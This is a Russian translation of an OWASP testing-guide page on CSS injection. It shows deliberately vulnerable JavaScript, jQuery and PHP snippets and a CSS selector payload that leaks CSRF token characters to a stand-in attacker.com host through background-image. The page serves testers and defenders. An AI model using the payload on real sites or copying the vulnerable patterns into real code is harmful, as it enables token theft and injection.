# Внедрение CSS

| ID |
| --- |
| WSTG-CLNT-05 |

## Резюме

Уязвимость внедрения CSS-кода (CSS Injection) заключается в возможности внедрения произвольного CSS-кода в контекст доверенного сайта, который затем обрабатывается и отображается в браузере жертвы. Степень воздействия данного типа уязвимости варьируется в зависимости от переданной полезной нагрузки CSS. Это может приводить к межсайтовому скриптингу (Cross-Site Scripting, XSS) или эксфильтрации данных (data exfiltration).

Данная уязвимость возникает в ситуациях, когда приложение позволяет пользовательскому CSS взаимодействовать с легитимными таблицами стилей ресурса. Внедрение кода в контекст CSS при определенных условиях способно предоставить атакующему возможность выполнять JavaScript либо извлекать конфиденциальные значения с помощью селекторов CSS (CSS selectors) и функций, способных генерировать HTTP-запросы. В целом предоставление пользователям возможности кастомизировать страницы путем передачи собственных файлов CSS несет в себе значительный риск.

В следующем фрагменте кода JavaScript продемонстрирован потенциально уязвимый сценарий, в котором злоумышленник способен контролировать источник `location.hash` (source), передающий значение в приёмник `cssText` (sink). Этот конкретный случай может приводить к DOM-based XSS в устаревших версиях браузеров; дополнительную информацию см. в документе [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

> Note: Некоторые методы выполнения JavaScript на базе CSS опираются на поведение устаревших браузеров (например, ранних версий IE и Opera). Хотя современные браузеры нейтрализуют большинство таких векторов, внедрение CSS по-прежнему способно обеспечить эксфильтрацию данных, манипуляцию пользовательским интерфейсом (UI manipulation) и выстраивание цепочек атак (attack chaining).

Такая же уязвимость может проявляться в случае отраженного XSS — например, в следующем коде на PHP:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Дальнейшие сценарии атак связаны с возможностью извлечения данных исключительно с использованием правил чистой разметки CSS. Подобные атаки реализуются через селекторы CSS и приводят к эксфильтрации данных — например, токенов защиты от подделки межсайтовых запросов (Cross-Site Request Forgery, CSRF).

Ниже приведен пример кода, который пытается выбрать элемент input с именем `csrf_token` и атрибутом `value`, начинающимся на символ `a`. Используя атаку методом перебора (brute-force) для поэтапного подбора значения атрибута `value`, можно реализовать передачу значения на домен атакующего — например, посредством попытки установить фоновое изображение (background-image) для выбранного элемента ввода.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>
```

Другие векторы атак с использованием подгружаемого содержимого, такого как CSS, освещены в докладе [Марио Хайдериха (Mario Heiderich) «Got Your Nose»](https://www.youtube.com/watch?v=FIQvAaZj_HA) на YouTube.

## Цели тестирования

- Идентифицировать точки внедрения CSS-кода.
- Оценить степень воздействия инъекции.

## Методика тестирования

Исходный код необходимо проанализировать, чтобы определить, разрешено ли пользователю внедрять данные в контекст CSS. В частности, следует проверить, каким образом сайт формирует и возвращает CSS-правила на основе входящих параметров.

Ниже приведен базовый пример:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Приведенный выше код содержит источник `location.hash`, контролируемый атакующим, который может напрямую внедрять значения в атрибут `style` HTML-элемента. Как отмечалось ранее, это может приводить к различным результатам в зависимости от используемого браузера и переданной полезной нагрузки.
